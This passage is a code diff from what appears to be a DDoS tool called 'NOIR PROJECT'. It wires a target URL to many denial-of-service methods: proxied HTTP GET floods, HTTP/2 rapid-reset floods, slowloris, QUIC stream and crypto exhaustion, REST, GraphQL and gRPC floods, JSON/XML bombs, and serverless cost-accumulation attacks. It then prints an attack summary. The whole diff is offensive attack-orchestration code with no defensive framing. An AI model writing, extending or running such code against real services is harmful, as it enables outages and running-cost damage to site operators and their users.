+        from core.attack.enhanced import run_enhanced_attack
+        proxy_file = args.proxy_file or "proxies/http.txt"
+        proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
+        total = await proxy_pool.load_file(proxy_file)
+        if total == 0:
+            print(f" {c('r','[-]')} No proxies in {proxy_file}")
+            return
+        proxy_pool._validator.set_target(target)
+        alive = await proxy_pool.quick_validate(total, concurrency=40)
+        print(f" {c('g','[+]')} {alive}/{total} proxies alive")
+        result = await run_enhanced_attack(
+            url=target, duration=duration, method="http_get_flood",
+            rps=rps, proxy_pool=proxy_pool
+        )
+    elif method == "mixed":
+        profile = await auto_detect_target(target, verbose=True)
+        per = rps // 3
+        tasks = []
+        if profile and profile.supports_http2:
+            tasks.append(run_go_engine(target, duration, int(rps * 0.6), "http-flood", rapid_reset=True))
+            tasks.append(run_go_engine(target, duration, int(rps * 0.3), "http-flood", http2=True))
+        else:
+            tasks.append(run_go_engine(target, duration, int(rps * 0.5), "http-flood"))
+            tasks.append(run_go_engine(target, duration, int(rps * 0.4), "http-flood"))
+        from core.attack.enhanced import run_enhanced_attack
+        tasks.append(run_enhanced_attack(url=target, duration=duration, method="slowloris", rps=200))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        for r in results:
+            if isinstance(r, dict):
+                for k in result:
+                    result[k] += r.get(k, 0)
+    elif method in ("quic-stream-hijack", "quic-cid-flood", "quic-crypto-exhaust"):
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps, method=method
+        )
+    elif method in ("api-flood", "api-rest"):
+        from core.attack.api_attacks import API_ATTACK_METHODS
+        result = await API_ATTACK_METHODS["api_rest_flood"](url=target, duration=duration, rps=rps)
+    elif method in ("graphql", "graphql-deep"):
+        from core.attack.api_attacks import API_ATTACK_METHODS
+        result = await API_ATTACK_METHODS["graphql_deep"](url=target, duration=duration, rps=rps)
+    elif method == "grpc-flood":
+        from core.attack.api_attacks import API_ATTACK_METHODS
+        result = await API_ATTACK_METHODS["grpc_flood"](url=target, duration=duration, rps=rps)
+    elif method in ("json-bomb", "xml-bomb"):
+        from core.attack.api_attacks import API_ATTACK_METHODS
+        result = await API_ATTACK_METHODS["json_bomb"](url=target, duration=duration, rps=rps)
+    elif method in ("cold-start", "cost-accum"):
+        from core.attack.serverless_dow import DOW_ATTACK_METHODS
+        result = await DOW_ATTACK_METHODS["cold_start"](url=target, duration=duration, rps=rps)
+    else:
+        # Default to http-flood
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps, method="http-flood"
+        )
 
-    elapsed = time.time() - start
-    m = engine.get_metrics()
-    tot, ok, fail, to = m["total_requests"], m["completed"], m["failed"], m["timeout"]
-
-    print()
-    print(c("w", "=" * 70))
-    print(c("w", "  NOIR PROJECT | Attack Summary"))
-    print(c("w", "=" * 70))
-    print(f"  Target:          {target}")
-    print(f"  Duration:        {int(elapsed//60)}m {int(elapsed%60)}s")
-    print(f"  Total Requests:  {tot}")
-    print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
-    print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
-    print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
-    print(f"  Peak RPS:        {m['peak_rps']:.1f}")
-    print(f"  Avg RTT:         {m['avg_response_time_ms']:.0f}ms")
-    print(f"  Tier:            {m['tier']}")
-    print(f"  Method:          {method}")
-    print(c("w", "=" * 70))
-
-    log = f"logs/attack_{datetime.now():%Y%m%d_%H%M%S}.log"
-    try:
-        with open(log, "w") as f:
-            json.dump({"target": target, "metrics": m}, f, indent=2)
-        print(f" {c('g','[+]')} Log: {log}")
-    except Exception:
-        pass
-
-    if health_task:
-        health_task.cancel()
-    if bg_task:
-        bg_task.cancel()
-    for t in [health_task, bg_task]:
-        if t:
-            try:
-                await asyncio.wait_for(t, timeout=2.0)
-            except (asyncio.CancelledError, asyncio.TimeoutError, Exception):
-                pass
-
+    print_attack_summary(target, duration, result)
 
 if __name__ == "__main__":
     try:
